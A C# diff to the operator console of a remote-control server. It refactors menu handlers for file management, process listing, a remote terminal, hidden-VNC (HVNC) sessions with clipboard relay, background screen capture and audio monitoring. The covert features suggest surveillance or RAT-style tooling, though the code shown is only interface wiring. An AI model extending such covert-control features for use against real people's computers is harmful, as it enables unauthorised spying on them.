@@ -28,7 +28,7 @@ namespace RemoteControl.Server
         {
             if (currentSession == null) return;
             // 切换到文件管理选项卡
-            this.tabControl1.SelectedIndex = 0;
+            ShowTabFeature(FileManagerTabIndex);
             currentSession.Send(ePacketType.PACKET_GET_DRIVES_REQUEST, null);
         }
 
@@ -41,6 +41,9 @@ namespace RemoteControl.Server
         private void onMenuHDScreen(object sender, EventArgs e)
         {
             if (currentSession == null) return;
+            // 确保 Relay 绑定指向当前客户端
+            if (RSCApplication.oRemoteControlServer != null)
+                RSCApplication.oRemoteControlServer.SelectClient(currentSession.SocketId);
             var frm = new FrmCaptureScreen(this.currentSession);
             string sessionId = this.currentSession.SocketId;
             if (!this.sessionScreenHandlers.ContainsKey(sessionId))
@@ -57,6 +60,9 @@ namespace RemoteControl.Server
         private void onMenuBackgroundScreen(object sender, EventArgs e)
         {
             if (currentSession == null) return;
+            // 确保 Relay 绑定指向当前客户端
+            if (RSCApplication.oRemoteControlServer != null)
+                RSCApplication.oRemoteControlServer.SelectClient(currentSession.SocketId);
             var frm = new FrmCaptureScreen(this.currentSession);
             string sessionId = this.currentSession.SocketId;
             if (!this.sessionScreenHandlers.ContainsKey(sessionId))
@@ -73,6 +79,9 @@ namespace RemoteControl.Server
         private void onMenuHVNC(object sender, EventArgs e)
         {
             if (currentSession == null) return;
+            // 确保 Relay 绑定指向当前客户端
+            if (RSCApplication.oRemoteControlServer != null)
+                RSCApplication.oRemoteControlServer.SelectClient(currentSession.SocketId);
             var frm = new FrmHVNC(this.currentSession);
             string sessionId = this.currentSession.SocketId;
             if (!this.sessionHVNCScreenHandlers.ContainsKey(sessionId))
@@ -85,17 +94,19 @@ namespace RemoteControl.Server
             else
                 this.sessionHVNCStartHandlers[sessionId] = frm.HandleStartResponse;
 
+            if (!this.sessionHVNCClipboardHandlers.ContainsKey(sessionId))
+                this.sessionHVNCClipboardHandlers.Add(sessionId, frm.HandleClipboardResponse);
+            else
+                this.sessionHVNCClipboardHandlers[sessionId] = frm.HandleClipboardResponse;
+
             frm.Show();
-            RequestHVNCStart req = new RequestHVNCStart();
-            req.Fps = 5;
-            currentSession.Send(ePacketType.PACKET_HVNC_START_REQUEST, req);
         }
 
         private void onMenuSystemManager(object sender, EventArgs e)
         {
             if (currentSession == null) return;
             // 切换到进程管理Tab并刷新进程列表
-            this.tabControl1.SelectedIndex = 4;
+            ShowTabFeature(ProcessManagerTabIndex);
             currentSession.Send(ePacketType.PACKET_GET_PROCESSES_REQUEST, new RequestGetProcesses());
         }
 
@@ -108,14 +119,13 @@ namespace RemoteControl.Server
         private void onMenuRemoteTerminal(object sender, EventArgs e)
         {
             if (currentSession == null) return;
-            this.tabControl1.SelectedIndex = 2;
+            ShowTabFeature(RemoteCommandTabIndex);
         }
 
         private void onMenuAudioCapture(object sender, EventArgs e)
         {
             if (currentSession == null) return;
-            currentSession.Send(ePacketType.PACKET_START_CAPTURE_AUDIO_REQUEST, new RequestStartCaptureAudio());
-            doOutput("已发送语音监听请求");
+            OpenAudioMonitorForm();
         }
 
     }
